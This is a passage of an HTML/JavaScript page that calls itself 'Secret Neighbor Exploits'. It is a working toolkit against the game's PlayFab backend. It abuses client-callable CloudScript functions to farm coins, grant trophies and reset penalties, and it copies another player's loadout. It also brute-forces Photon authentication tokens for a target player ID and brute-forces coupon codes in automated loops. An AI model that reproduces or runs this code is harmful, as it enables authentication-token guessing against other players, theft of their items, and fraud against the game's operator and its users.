        resultText += `Created: ${info.AccountInfo.Created || "N/A"}\n`;
        resultText += "\n=== STATISTICS ===\n";
        
        if (info.PlayerStatistics) {
          info.PlayerStatistics.forEach(stat => {
            resultText += `${stat.StatisticName}: ${stat.Value}\n`;
          });
        }
      }

      if (profileData.data) {
        const profile = profileData.data.PlayerProfile;
        resultText += "\n=== PROFILE INFO ===\n";
        resultText += `Last Login: ${profile.LastLogin || "N/A"}\n`;
        resultText += `Banned Until: ${profile.BannedUntil || "Not banned"}\n`;
      }

      if (combinedData.error || profileData.error) {
        resultText += "\n=== ERRORS ===\n";
        if (combinedData.error) resultText += `Combined Info Error: ${combinedData.error}\n`;
        if (profileData.error) resultText += `Profile Error: ${profileData.error}\n`;
      }

      output.textContent = resultText || "No data received.";
    }

    async function updateQuestProgress() {
      const questTextFieldId = document.getElementById("questTextFieldId").value.trim();
      const progressValue = parseInt(document.getElementById("questProgressValue").value);
      
      if (!questTextFieldId || isNaN(progressValue)) {
        document.getElementById("questOutput").textContent = "Please fill all fields correctly.";
        return;
      }

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "updateActiveQuests",
        FunctionParameter: {
          updatedValues: `{"${questTextFieldId}":${progressValue}}`
        },
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const output = document.getElementById("questOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else if (data.data && data.data.FunctionResult) {
        output.textContent = formatResponse(data.data.FunctionResult);
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function increasePenaltyPoints() {
      const output = document.getElementById("penaltyOutput");
      output.textContent = "Increasing penalty points...\n";
      
      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "increaseLowPriorityMatches",
        FunctionParameter: {
          reason: "LEAVE_MATCH"
        },
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      if (data.error) {
        output.textContent += `‚ùå Error: ${data.error}\n`;
      } else {
        output.textContent += `‚úÖ Penalty points increased successfully\n`;
        output.textContent += formatResponse(data.data);
      }
      output.scrollTop = output.scrollHeight;
    }

    async function decreasePenaltyPoints() {
      const output = document.getElementById("penaltyOutput");
      output.textContent = "Decreasing penalty points...\n";
      
      const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "refreshStartPunishmentLevelTime",
        FunctionParameter: null,
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const xpMultiplierData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "getXpMultiplier",
        FunctionParameter: {
          playerCount: 0
        },
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const popCornData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "checkPopCornEvent",
        FunctionParameter: null,
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `‚ùå Error: ${refreshData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `‚ùå Error: ${xpMultiplierData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `checkPopCornEvent: ${popCornData.error ? `‚ùå Error: ${popCornData.error}` : "‚úÖ Success"}\n`;
      output.scrollTop = output.scrollHeight;
    }

    async function startMatchStatusSequence() {
      const playerId = document.getElementById("matchPlayerId").value.trim();
      const output = document.getElementById("penaltyOutput");
      
      if (!playerId) {
        output.textContent = "Please enter a Player ID for match status.\n";
        return;
      }

      output.textContent = "Starting match status sequence...\n";
      
      const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "refreshStartPunishmentLevelTime",
        FunctionParameter: null,
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const xpMultiplierData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "getXpMultiplier",
        FunctionParameter: {
          playerCount: 0
        },
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const popCornData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "checkPopCornEvent",
        FunctionParameter: null,
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `‚ùå Error: ${refreshData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `‚ùå Error: ${xpMultiplierData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `checkPopCornEvent: ${popCornData.error ? `‚ùå Error: ${popCornData.error}` : "‚úÖ Success"}\n`;
      output.textContent += "Waiting 10 minutes to update match status...\n";
      output.scrollTop = output.scrollHeight;

      setTimeout(async () => {
        const matchData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
          CustomTags: null,
          FunctionName: "changeMatchPlayerStatus",
          FunctionParameter: {
            playerId: playerId,
            matchId: "",
            newStatus: "FINISHED"
          },
          GeneratePlayStreamEvent: true,
          RevisionSelection: null,
          SpecificRevision: null,
          AuthenticationContext: null
        });

        output.textContent += `changeMatchPlayerStatus: ${matchData.error ? `‚ùå Error: ${matchData.error}` : "‚úÖ Success"}\n`;
        output.scrollTop = output.scrollHeight;
      }, 10 * 60 * 1000);
    }

    function toggleCoinFarmBot() {
      if (coinFarmBotRunning) {
        clear(coinFarmId);
        coinFarmBotRunning = false;
        document.getElementById("botStatus").className = "status-indicator status-inactive";
        document.getElementById("botToggleButton").textContent = "Start Coin Farm Bot";
        document.getElementById("cloudOutput").textContent += "\nBot stopped manually.";
        return;
      }

      const delayMinutes = parseInt(document.getElementById("delaySelect").value);
      const delayMs = delayMinutes * 60 * 1000;

      coinFarmBotRunning = true;
      document.getElementById("botStatus").className = "status-indicator status-active";
      document.getElementById("botToggleButton").textContent = "Stop Coin Farm Bot";

      document.getElementById("cloudOutput").textContent = 
        `Starting Coin Farm Bot with ${delayMinutes} minute ...\n`;

      async function runCoinFarmCycle() {
        const roomType = document.getElementById("roomType").value;
        const playerIds = [
          document.getElementById("playerId1").value.trim(),
          document.getElementById("playerId2").value.trim(),
          document.getElementById("playerId3").value.trim(),
          document.getElementById("playerId4").value.trim(),
          document.getElementById("playerId5").value.trim(),
          document.getElementById("playerId6").value.trim()
        ].filter(id => id);

        let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()} ===\n`;
        output += `Room Type: ${roomType}\nPlayers: ${playerIds.join(", ") || "None"}\n`;

        let matchId = null;

        try {
          const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
            FunctionName: "startNewMatch",
            FunctionParameter: { roomType, playerIds },
            GeneratePlayStreamEvent: true
          });

          if (data.error) {
            output += `‚ùå startNewMatch: Error - ${data.error}\n`;
          } else if (data.data?.FunctionResult?.currentMatchId) {
            matchId = data.data.FunctionResult.currentMatchId;
            output += `‚úÖ startNewMatch: MatchId - ${matchId}\n`;
          } else {
            output += `‚úÖ startNewMatch: Success\n`;
          }
        } catch (err) {
          output += `‚ùå startNewMatch: Exception - ${err.message}\n`;
        }

        try {
          const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
            FunctionName: "decideSpecialRole",
            FunctionParameter: { roomType, playerIds },
            GeneratePlayStreamEvent: true
          });

          if (data.error) {
            output += `‚ùå decideSpecialRole: Error - ${data.error}\n`;
          } else {
            output += `‚úÖ decideSpecialRole: Success\n`;
          }
        } catch (err) {
          output += `‚ùå decideSpecialRole: Exception - ${err.message}\n`;
        }

        if (matchId) {
          try {
            const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
              CustomTags: null,
              FunctionName: "xpConsumed",
              FunctionParameter: {
                token: matchId
              },
              GeneratePlayStreamEvent: true,
              RevisionSelection: null,
              SpecificRevision: null,
              AuthenticationContext: null
            });

            if (data.error) {
              output += `‚ùå xpConsumed: Error - ${data.error}\n`;
            } else {
              output += `‚úÖ xpConsumed: Success\n`;
            }
          } catch (err) {
            output += `‚ùå xpConsumed: Exception - ${err.message}\n`;
          }
        } else {
          output += `‚è© xpConsumed: Skipped - No MatchId available\n`;
        }

        try {
          const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
            FunctionName: "finishMatch",
            FunctionParameter: { roomType, playerIds },
            GeneratePlayStreamEvent: true
          });

          if (data.error) {
            output += `‚ùå finishMatch: Error - ${data.error}\n`;
          } else if (data.data?.Logs) {
            output += `‚úÖ finishMatch: Success\nLogs:\n`;
            data.data.Logs.forEach(log => {
              output += `- ${log.Message}\n`;
            });
          } else {
            output += `‚úÖ finishMatch: Success\n`;
          }
        } catch (err) {
          output += `‚ùå finishMatch: Exception - ${err.message}\n`;
        }

        output += `Waiting ${delayMinutes} minutes for next cycle...\n`;
        const cloudOutput = document.getElementById("cloudOutput");
        cloudOutput.textContent += output;
        cloudOutput.scrollTop = cloudOutput.scrollHeight;
      }

      runCoinFarmCycle();
      coinFarmId = set(runCoinFarmCycle, delayMs);
    }

    function toggleLevelEditor() {
      if (levelEditorRunning) {
        clear(levelEditorId);
        levelEditorRunning = false;
        document.getElementById("levelEditorStatus").className = "status-indicator status-inactive";
        document.getElementById("levelEditorToggleButton").textContent = "Start Level Editor";
        document.getElementById("levelProgressionOutput").textContent += "\nLevel editor stopped manually.";
        return;
      }

      levelEditorRunning = true;
      document.getElementById("levelEditorStatus").className = "status-indicator status-active";
      document.getElementById("levelEditorToggleButton").textContent = "Stop Level Editor";

      document.getElementById("levelProgressionOutput").textContent = 
        `Starting Level Editor...\n`;

      async function runLevelEditorCycle() {
        let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()} ===\n`;

        try {
          const data = await submitLevelProgression();

          if (data.error) {
            output += `‚ùå setLevelProgressionForClass: Error - ${data.error}\n`;
          } else {
            output += `‚úÖ setLevelProgressionForClass: Success\n`;
          }
        } catch (err) {
          output += `‚ùå setLevelProgressionForClass: Exception - ${err.message}\n`;
        }

        const levelOutput = document.getElementById("levelProgressionOutput");
        levelOutput.textContent += output;
        levelOutput.scrollTop = levelOutput.scrollHeight;
      }

      runLevelEditorCycle();
      levelEditorId = set(runLevelEditorCycle, 1000);
    }

    function togglePhotonTokenGenerator() {
      if (photonTokenRunning) {
        clear(photonTokenId);
        photonTokenRunning = false;
        document.getElementById("photonTokenStatus").className = "status-indicator status-inactive";
        document.getElementById("photonTokenToggleButton").textContent = "Start Generating Photon Token";
        document.getElementById("photonTokenOutput").textContent += "\nPhoton token generator stopped manually.";
        return;
      }

      photonTokenRunning = true;
      document.getElementById("photonTokenStatus").className = "status-indicator status-active";
      document.getElementById("photonTokenToggleButton").textContent = "Stop Generating Photon Token";

      document.getElementById("photonTokenOutput").textContent = "Starting Photon token generation...\n";

      async function generatePhotonToken() {
        const data = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
          PhotonApplicationId: "2b76b55a-bf65-47af-836f-daa9c8eb9f1e",
          AuthenticationContext: null
        });

        const output = document.getElementById("photonTokenOutput");
        if (data.data?.PhotonCustomAuthenticationToken) {
          output.textContent += `‚úÖ Photon Token: ${data.data.PhotonCustomAuthenticationToken}\n`;
        } else {
          output.textContent += `‚ùå Error: ${data.error || "Failed to generate token"}\n`;
        }
        output.scrollTop = output.scrollHeight;
      }

      generatePhotonToken();
      photonTokenId = set(generatePhotonToken, 1000);
    }

    async function resetLoadout() {
      const output = document.getElementById("resetLoadoutOutput");
      const getData = await makeApiCall("Client/GetUserData", "POST", {});
      if (getData.error) {
        output.textContent = `Error getting data: ${getData.error}`;
        return;
      }
      if (getData.data.Data && "loadout" in getData.data.Data) {
        const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
          Data: { loadout: null }
        });
        if (updateData.error) {
          output.textContent = `Error resetting: ${updateData.error}`;
        } else {
          output.textContent = "Loadout reset successfully!";
        }
      } else {
        output.textContent = "No loadout found to reset.";
      }
    }

    async function stealLoadout() {
      const targetId = document.getElementById("targetPlayFabId").value.trim();
      const output = document.getElementById("stealLoadoutOutput");
      if (!targetId) {
        output.textContent = "Please enter a target PlayFab ID.";
        return;
      }
      const getData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
        PlayFabId: targetId,
        InfoRequestParameters: { GetUserData: true }
      });
      if (getData.error) {
        output.textContent = `Error getting data: ${getData.error}`;
        return;
      }
      const userData = getData.data.InfoResultPayload.UserData;
      if (userData && "loadout" in userData) {
        const loadoutValue = userData.loadout.Value;
        const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
          Data: { loadout: loadoutValue }
        });
        if (updateData.error) {
          output.textContent = `Error updating: ${updateData.error}`;
        } else {
          output.textContent = "Loadout stolen successfully!";
        }
      } else {
        output.textContent = "No loadout found on target.";
      }
    }

    function generateRandomToken() {
      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      const tokenLength = 50;
      let token = '';
      for (let i = 0; i < tokenLength; i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      totalTokensGenerated++;
      return token;
    }

    async function checkToken(playFabId, token) {
      try {
        const response = await fetch(`https://${titleId}.playfabapi.com/photon/authenticate?username=${playFabId}&token=${token}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'X-Authorization': sessionTicket
          }
        });
        const result = await response.json();
        return { token, result };
      } catch (error) {
        return { token, error: error.message };
      }
    }

    function downloadLog() {
      const logContent = logEntries.join('\n');
      const blob = new Blob([logContent], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `bruteforce_log_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    }

    async function startBruteforce() {
      if (bruteforceRunning) return;

      const playFabId = document.getElementById("playFabUsername").value.trim();
      const output = document.getElementById("bruteforceOutput");

      if (!playFabId) {
        output.textContent = "Please enter a PlayFab ID.";
        return;
      }

      if (!sessionTicket) {
        output.textContent = "Please set your SessionTicket first.";
        return;
      }

      bruteforceRunning = true;
      failedAttempts = 0;
      totalTokensGenerated = 0;
      logEntries.length = 0; // Clear previous logs
      let foundValid = false;
      output.textContent = "Token bruteforcer enabled! We will notify you when we find a valid token.\n";

      async function tryTokenBatch() {
        if (!bruteforceRunning) return;

        const batchSize = 1000;
        const tokens = Array.from({ length: batchSize }, generateRandomToken);
        const results = await Promise.all(tokens.map(token => checkToken(playFabId, token)));

        const outputBuffer = [];

        for (const { token, result, error } of results) {
          if (error) {
            failedAttempts++;
            const logEntry = `Error for token ${token}: ${error}`;
            logEntries.push(logEntry);
            outputBuffer.push(logEntry);
          } else {
            const logEntry = `Token: ${token}, ResultCode: ${result.resultCode}, Response: ${JSON.stringify(result)}`;
            logEntries.push(logEntry);
            if (result.resultCode === 1) {
              outputBuffer.push(`‚úÖ Valid token found: ${token} (Failed Attempts: ${failedAttempts})`);
              foundValid = true;
            } else {
              failedAttempts++;
            }
          }
        }

        if (outputBuffer.length > 0) {
          output.textContent += outputBuffer.join('\n') + '\n';
          output.scrollTop = output.scrollHeight;
        }

        if (foundValid) {
          output.textContent += `Valid token found: ${results.find(r => r.result?.resultCode === 1).token}\n`;
          logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
          downloadLog();
          stopBruteforce();
        } else if (bruteforceRunning) {
          setTimeout(tryTokenBatch, 0);
        }
      }

      tryTokenBatch().catch(error => {
        const errorMsg = `Batch error: ${error.message}`;
        logEntries.push(errorMsg);
        output.textContent += errorMsg + '\n';
        output.scrollTop = output.scrollHeight;
        logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
        downloadLog();
        stopBruteforce();
      });
    }

    function stopBruteforce() {
      bruteforceRunning = false;
      const output = document.getElementById("bruteforceOutput");
      output.textContent += `Photon token bruteforce stopped. Failed Attempts: ${failedAttempts}\n`;
      output.scrollTop = output.scrollHeight;
      logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
      downloadLog();
    }

  function toggleBruteforceRedeemCoupon() {
  if (couponBruteforceRunning) {
    clear(couponBruteforceId);
    couponBruteforceRunning = false;
    document.getElementById("couponBruteforceStatus").className = "status-indicator status-inactive";
    document.getElementById("couponBruteforceToggleButton").textContent = "Start Bruteforce Redeem Coupon";
    document.getElementById("apiOutput").textContent += `\nCoupon bruteforce stopped manually. Total attempts: ${attempts}\n`;
    document.getElementById("apiOutput").scrollTop = document.getElementById("apiOutput").scrollHeight;
    return;
  }

  if (!sessionTicket) {
    document.getElementById("apiOutput").textContent = "Please set your SessionTicket first.\n";
    return;
  }

  couponBruteforceRunning = true;
  attempts = 0; // Reset attempts counter
  document.getElementById("couponBruteforceStatus").className = "status-indicator status-active";
  document.getElementById("couponBruteforceToggleButton").textContent = "Stop Bruteforce Redeem Coupon";
  document.getElementById("apiOutput").textContent = "Starting coupon bruteforce...\n";

  function generateCouponCode() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let code = '';
    for (let i = 0; i < 3; i++) {
      code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    code += '-';
    for (let i = 0; i < 4; i++) {
      code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    code += '-';
    for (let i = 0; i < 3; i++) {
      code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
  }

  async function runCouponBruteforce() {
    if (!couponBruteforceRunning) return;

    const couponCode = generateCouponCode();
    attempts++;
    const output = document.getElementById("apiOutput");
    output.textContent += `Attempt ${attempts}: Trying ${couponCode}...\n`;

    try {
      const data = await makeApiCall("Client/RedeemCoupon", "POST", {
        CouponCode: couponCode,
        CatalogVersion: "Ingame"
      });

      if (data.error) {
        output.textContent += `‚ùå Failed: ${data.errorMessage || data.error}\n`;
      } else {
        output.textContent += `‚úÖ Success! Coupon ${couponCode} redeemed!\n`;
        output.textContent += formatResponse(data.data);
        toggleBruteforceRedeemCoupon(); // Stop on success
      }
    } catch (err) {
      output.textContent += `‚ùå Error: ${err.message}\n`;
    }

    output.scrollTop = output.scrollHeight;
  }

  runCouponBruteforce();
  couponBruteforceIntervalId = setInterval(runCouponBruteforce, 1000); // 1
}

    async function grantTrophy() {
      const trophyId = document.getElementById("trophyId").value.trim();
      const output = document.getElementById("apiOutput");

      if (!trophyId) {
        output.textContent = "Please enter a Trophy ID.";
        return;
      }

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        FunctionName: "grantTrophy",
        FunctionParameter: {
          trophyToGrant: trophyId
        },
        GeneratePlayStreamEvent: true
      });

      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else if (data.data && data.data.FunctionResult) {
        output.textContent = formatResponse(data.data.FunctionResult);
      } else {
        output.textContent = formatResponse(data.data);
      }
      output.scrollTop = output.scrollHeight;
    }

    document.addEventListener("DOMContentLoaded", function() {
      console.log("Secret Neighbor Exploits page loaded");
      const savedTicket = localStorage.getItem('sessionTicket');
      if (savedTicket) {
        sessionTicket = savedTicket;
        document.getElementById("sessionTicketInput").value = savedTicket;
        const tokenStatus = document.getElementById("tokenStatus");
        tokenStatus.textContent = "‚úÖ Token loaded from storage!";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "green";
      }
    });
  </script>
</body>
</html>
